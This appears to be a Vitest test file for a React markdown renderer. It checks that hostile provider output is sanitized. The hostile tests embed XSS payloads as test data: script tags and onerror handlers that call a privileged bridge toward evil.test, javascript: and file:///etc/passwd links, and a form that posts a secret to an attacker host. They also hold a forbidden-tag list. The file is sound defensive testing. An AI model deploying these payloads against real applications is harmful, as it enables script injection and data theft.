import { render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

import {
  RESPONSE_MARKDOWN_TAG_NAMES,
  ResponseMarkdown,
} from "../../src/renderer/src/components/ResponseMarkdown";

const PROJECT_ROOT = "/workspace/project";

function inertiaBridge() {
  const openExternal = vi.fn(async () => undefined);
  const openProjectPath = vi.fn(async () => undefined);
  Object.defineProperty(window, "inertia", {
    configurable: true,
    value: { openExternal, openProjectPath },
  });
  return { openExternal, openProjectPath };
}

function renderMarkdown(content: string): HTMLElement {
  const { container } = render(
    <ResponseMarkdown
      content={content}
      projectRoot={PROJECT_ROOT}
      projectId="project-1"
      defaultCodeWrap={false}
    />,
  );
  return container;
}

afterEach(() => {
  Reflect.deleteProperty(window, "inertia");
  vi.restoreAllMocks();
});

describe("hostile provider markdown", () => {
  it("never renders a script element", () => {
    const container = renderMarkdown(
      "<script>window.inertia.openExternal('https://evil.test')</script>",
    );
    expect(container.querySelector("script")).toBeNull();
  });

  it("strips event-handler attributes", () => {
    const container = renderMarkdown(
      "<div onclick=\"window.inertia.openExternal('https://evil.test')\">click</div>"
      + "<img src=x onerror=\"window.inertia.openExternal('https://evil.test')\">",
    );
    for (const element of container.querySelectorAll("*")) {
      for (const attribute of element.attributes) {
        expect(attribute.name.toLowerCase()).not.toMatch(/^on/u);
      }
    }
  });

  it("removes svg payloads", () => {
    const container = renderMarkdown(
      "<svg><script>alert(1)</script><use href=\"#x\" /></svg>",
    );
    expect(container.querySelector("svg")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("use")).toBeNull();
  });

  it("blocks javascript: links", () => {
    const bridge = inertiaBridge();
    renderMarkdown("[click](javascript:window.inertia.openExternal('x'))");
    const blocked = screen.getByTitle(/blocked/u);
    expect(blocked).toBeTruthy();
    expect(blocked.tagName.toLowerCase()).toBe("span");
    expect(bridge.openExternal).not.toHaveBeenCalled();
  });

  it("blocks data: links", () => {
    renderMarkdown("[click](data:text/html;base64,PHNjcmlwdD4x)");
    expect(screen.getByTitle(/blocked/u)).toBeTruthy();
  });

  it("blocks file: links", () => {
    renderMarkdown("[etc](file:///etc/passwd)");
    expect(screen.getByTitle(/blocked/u)).toBeTruthy();
  });

  it("blocks custom application schemes", () => {
    for (const href of ["inertia://runtime/command", "vscode://file/etc"]) {
      const container = renderMarkdown(`[open](${href})`);
      expect(container.querySelector("a")).toBeNull();
    }
  });

  it("never leaves an anchor pointing at a privileged protocol", () => {
    const container = renderMarkdown(
      "<a href=\"inertia://runtime\">x</a>"
      + "<a href=\"javascript:alert(1)\">y</a>"
      + "<a href=\"vbscript:msgbox\">z</a>",
    );
    for (const anchor of container.querySelectorAll("a")) {
      const href = anchor.getAttribute("href") ?? "";
      expect(href).not.toMatch(/^(?:javascript|vbscript|data|file|inertia):/iu);
    }
  });

  it("removes embedded forms", () => {
    const container = renderMarkdown(
      "<form action=\"https://evil.test\" method=\"post\">"
      + "<input name=\"secret\" /><button>go</button></form>",
    );
    expect(container.querySelector("form")).toBeNull();
    expect(container.querySelector("button")).toBeNull();
    expect(container.querySelector("input[name]")).toBeNull();
  });

  it("removes iframes, objects and embeds", () => {
    const container = renderMarkdown(
      "<iframe src=\"https://evil.test\"></iframe>"
      + "<object data=\"https://evil.test\"></object>"
      + "<embed src=\"https://evil.test\" />",
    );
    expect(container.querySelector("iframe")).toBeNull();
    expect(container.querySelector("object")).toBeNull();
    expect(container.querySelector("embed")).toBeNull();
  });

  it("removes style and base elements", () => {
    const container = renderMarkdown(
      "<style>body{display:none}</style><base href=\"https://evil.test\" />",
    );
    expect(container.querySelector("style")).toBeNull();
    expect(container.querySelector("base")).toBeNull();
  });

  it("does not keep remote image sources that could leak metadata", () => {
    const container = renderMarkdown("![beacon](https://evil.test/pixel.png)");
    const image = container.querySelector("img");
    if (image) {
      expect(image.getAttribute("src")).not.toMatch(/^file:/iu);
      expect(image.getAttribute("src")).not.toMatch(/^inertia:/iu);
    }
  });

  it("does not let images reference local files", () => {
    const container = renderMarkdown(
      "![local](file:///etc/passwd)<img src=\"file:///etc/shadow\" />",
    );
    for (const image of container.querySelectorAll("img")) {
      expect(image.getAttribute("src") ?? "").not.toMatch(/^file:/iu);
    }
  });

  it("survives malformed nested markdown and html", () => {
    const container = renderMarkdown(
      "<details><summary>a<summary><div><p>**bold"
      + "\n\n```js\nunclosed\n<script>alert(1)</script>"
      + "\n<table><tr><td>[link](javascript:x)",
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.textContent).toBeTruthy();
  });

  it("handles an extremely large markdown input", () => {
    const container = renderMarkdown(
      `${"paragraph text ".repeat(40_000)}\n\n<script>alert(1)</script>`,
    );
    expect(container.querySelector("script")).toBeNull();
  });

  it("never calls a privileged bridge method while rendering", () => {
    const bridge = inertiaBridge();
    renderMarkdown(
      "<script>window.inertia.openProjectPath({})</script>"
      + "<img src=x onerror=\"window.inertia.openProjectPath({})\">"
      + "[a](javascript:window.inertia.openProjectPath({}))",
    );
    expect(bridge.openExternal).not.toHaveBeenCalled();
    expect(bridge.openProjectPath).not.toHaveBeenCalled();
  });

  it("keeps the allowlist explicit and narrow", () => {
    const tags = new Set<string>(RESPONSE_MARKDOWN_TAG_NAMES);
    for (const forbidden of [
      "script", "iframe", "object", "embed", "form", "button", "style",
      "base", "link", "meta", "svg", "math", "template", "textarea",
      "select", "option", "audio", "video", "canvas", "noscript", "frame",
      "frameset", "applet", "portal", "slot",
    ]) {
      expect(tags.has(forbidden)).toBe(false);
    }
    expect(tags.has("details")).toBe(true);
    expect(tags.has("summary")).toBe(true);
    expect(tags.has("code")).toBe(true);
    expect(tags.has("pre")).toBe(true);
  });
});

describe("safe provider markdown still works", () => {
  it("renders collapsible details from raw html", () => {
    const container = renderMarkdown(
      "<details><summary>More</summary>\n\nInner text\n\n</details>",
    );
    expect(container.querySelector("details")).toBeTruthy();
    expect(container.querySelector("summary")?.textContent).toContain("More");
  });

  it("renders and highlights fenced code blocks", () => {
    const container = renderMarkdown(
      "```typescript\nconst answer: number = 42;\n```",
    );
    const code = container.querySelector("pre code");
    expect(code).toBeTruthy();
    expect(code?.className).toContain("language-typescript");
    expect(code?.textContent).toContain("const answer");
  });

  it("keeps ordinary external links usable", () => {
    const bridge = inertiaBridge();
    const container = renderMarkdown("[docs](https://example.test/docs)");
    const anchor = container.querySelector("a");
    expect(anchor?.getAttribute("href")).toBe("https://example.test/docs");
    anchor?.click();
    expect(bridge.openExternal).toHaveBeenCalledWith(
      "https://example.test/docs",
    );
  });

  it("renders GFM tables and task lists", () => {
    const container = renderMarkdown(
      "| a | b |\n| --- | --- |\n| 1 | 2 |\n\n- [x] done\n- [ ] todo",
    );
    expect(container.querySelector("table")).toBeTruthy();
    expect(container.querySelectorAll("input[type=checkbox]").length).toBe(2);
  });
});
